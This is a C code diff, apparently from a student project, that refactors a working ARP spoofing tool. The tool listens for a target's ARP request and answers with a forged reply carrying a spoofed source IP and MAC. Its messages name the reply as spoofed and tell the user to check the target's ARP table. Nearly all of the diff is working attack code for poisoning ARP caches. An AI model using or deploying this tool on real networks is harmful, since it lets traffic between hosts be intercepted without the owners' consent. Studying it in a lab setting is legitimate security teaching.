@@ -51,7 +51,7 @@ void sig_handler(int signo)
 /* Return the newly created socket or -1 if an error occured */
 int init_socket(int *if_index)
 {
-	struct ifaddrs *interfaces, *if_found;
+	struct ifaddrs *interfaces, *if_found = NULL;
 	int packet_socket;
 
 	if (getifaddrs(&interfaces) == -1) {
@@ -91,11 +91,61 @@ int init_socket(int *if_index)
 
 }
 
+int send_reply(struct addr_data st_data[2], int if_index, int packet_socket)
+{
+	printf("Now sending an ARP reply to the target address with spoofed source. please wait...\n");
+	/* Create de ARP packet */
+	unsigned char r_buffer[BUFF_SIZE];
+	ft_memset(r_buffer, 0, sizeof(r_buffer));
+
+	struct eth_header *eth_rep = (struct eth_header *)r_buffer;
+	struct arp_header *arp_rep = (struct arp_header *)(r_buffer + ETH2_HEADER_LEN);
+
+	/* Create the eth header */
+	ft_memcpy(eth_rep->eth_dha, st_data[1].mac, MAC_LENGTH);
+	ft_memcpy(eth_rep->eth_sha, st_data[0].mac, MAC_LENGTH);
+	eth_rep->eth_type = htons(ETH_P_ARP);
+
+	/* Create de ARP header */
+	arp_rep->ar_hrd = htons(ARPHRD_ETHER);
+	arp_rep->ar_pro = htons(ETH_P_IP);
+	arp_rep->ar_hln = MAC_LENGTH;
+	arp_rep->ar_pln = IPV4_LENGTH;
+	arp_rep->ar_op = htons(ARP_REPLY);
+
+	ft_memcpy(arp_rep->ar_sha, st_data[0].mac, MAC_LENGTH);
+	ft_memcpy(arp_rep->ar_spa, &st_data[0].ip.s_addr, IPV4_LENGTH);
+	ft_memcpy(arp_rep->ar_tha, st_data[1].mac, MAC_LENGTH);
+	ft_memcpy(arp_rep->ar_tpa, &st_data[1].ip.s_addr, IPV4_LENGTH);
+
+	/* Create the sockaddr for the response */
+	struct sockaddr_ll socket_address;
+	ft_memset(&socket_address, 0, sizeof(socket_address));
+
+	socket_address.sll_family = AF_PACKET;
+	socket_address.sll_protocol = htons(ETH_P_ARP);
+	socket_address.sll_ifindex = if_index;
+	socket_address.sll_halen = MAC_LENGTH;
+
+	ft_memcpy(&socket_address.sll_addr, st_data[1].mac, MAC_LENGTH);
+
+	/* Send the response */
+	size_t r_buffer_size = sizeof(struct eth_header) + sizeof(struct arp_header);
+	if (sendto(packet_socket, r_buffer, r_buffer_size, 0,
+			   (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1)
+	{
+		err("sendto", strerror(errno));
+		return EXIT_FAILURE;
+	}
+	printf("Sent an ARP reply packet, you may now check the arp table on the target.\nExiting program...\n");
+
+	return EXIT_SUCCESS;
+}
+
 int main(int argc, char *argv[])
 {
-	struct in_addr s_ip, t_ip;
+	struct addr_data st_data[2];
 	struct sigaction sa;
-	unsigned char t_mac[6], s_mac[6];
 	int packet_socket, if_index;
 
 	if (argc != 5) {
@@ -103,11 +153,12 @@ int main(int argc, char *argv[])
 		return EXIT_FAILURE;
 	}
 
-	if (parse_mac(argv[4], t_mac) || parse_mac(argv[2], s_mac)) {
+	if (arg_check(argv + 1, &st_data[0].ip, &st_data[1].ip)) return EXIT_FAILURE;
+
+	if (parse_mac(argv[4], st_data[1].mac) || parse_mac(argv[2], st_data[0].mac)) {
 		err("parsing", "mac address");
 		return EXIT_FAILURE;
 	}
-	if (arg_check(argv + 1, &s_ip, &t_ip)) return EXIT_FAILURE;
 
 	ft_memset(&sa, 0, sizeof(sa));
 	sa.sa_handler = sig_handler;
@@ -136,11 +187,11 @@ int main(int argc, char *argv[])
 		uint16_t h_arp_op = ntohs(arp_req->ar_op);
 		if (h_arp_op != ARP_REQUEST) continue;
 
-		if (ft_memcmp(&s_ip.s_addr, arp_req->ar_tpa, 4)) continue;
+		if (ft_memcmp(&st_data[0].ip.s_addr, arp_req->ar_tpa, 4)) continue;
 		struct in_addr sender_ip;
 		ft_memcpy(&sender_ip.s_addr, arp_req->ar_spa, sizeof(uint32_t));
-		if (ft_memcmp(&sender_ip.s_addr, &t_ip.s_addr, 4)) continue;
-		if (ft_memcmp(t_mac, arp_req->ar_sha, 6)) continue;
+		if (ft_memcmp(&sender_ip.s_addr, &st_data[1].ip.s_addr, 4)) continue;
+		if (ft_memcmp(st_data[1].mac, arp_req->ar_sha, 6)) continue;
 
 
 		printf("An ARP request has been broadcast.\n");
@@ -160,48 +211,8 @@ int main(int argc, char *argv[])
 		else
 			printf("\tip address of request:  %s\n", str);
 
-		/* Create de ARP packet */
-		unsigned char r_buffer[BUFF_SIZE];
-		ft_memset(r_buffer, 0, sizeof(r_buffer));
-
-		struct eth_header *eth_rep = (struct eth_header *) r_buffer;
-		struct arp_header *arp_rep = (struct arp_header *) (r_buffer + ETH2_HEADER_LEN);
-
-		/* Create the eth header */
-		ft_memcpy(eth_rep->eth_dha, arp_req->ar_sha, MAC_LENGTH);
-		ft_memcpy(eth_rep->eth_sha, s_mac, MAC_LENGTH);
-		eth_rep->eth_type = htons(ETH_P_ARP);
-
-		/* Create de ARP header */
-		arp_rep->ar_hrd = htons(ARPHRD_ETHER);
-		arp_rep->ar_pro = htons(ETH_P_IP);
-		arp_rep->ar_hln = MAC_LENGTH;
-		arp_rep->ar_pln = IPV4_LENGTH;
-		arp_rep->ar_op = htons(ARP_REPLY);
-		
-		ft_memcpy(arp_rep->ar_sha, s_mac, MAC_LENGTH);
-		ft_memcpy(arp_rep->ar_spa, &s_ip.s_addr, IPV4_LENGTH);
-		ft_memcpy(arp_rep->ar_tha, t_mac, MAC_LENGTH);
-		ft_memcpy(arp_rep->ar_tpa, &t_ip.s_addr, IPV4_LENGTH);
-
-		/* Create the sockaddr for the response */
-		struct sockaddr_ll socket_address;
-		ft_memset(&socket_address, 0, sizeof(socket_address));
-
-		socket_address.sll_family = AF_PACKET;
-		socket_address.sll_protocol = htons(ETH_P_ARP);
-		socket_address.sll_ifindex = if_index;
-		socket_address.sll_halen = MAC_LENGTH;
-
-		ft_memcpy(&socket_address.sll_addr, t_mac, MAC_LENGTH);
-
-		/* Send the response */
-		size_t r_buffer_size = sizeof(struct eth_header) + sizeof(struct arp_header);
-		if (sendto(packet_socket, r_buffer, r_buffer_size, 0, 
-				(struct sockaddr *) &socket_address, sizeof(socket_address)) == -1) {
-					err("sendto", strerror(errno));
-					break;
-		}
+		if (send_reply(st_data, if_index, packet_socket) == 0)
+			break;
 		
 		s_flag = 0;
 	}
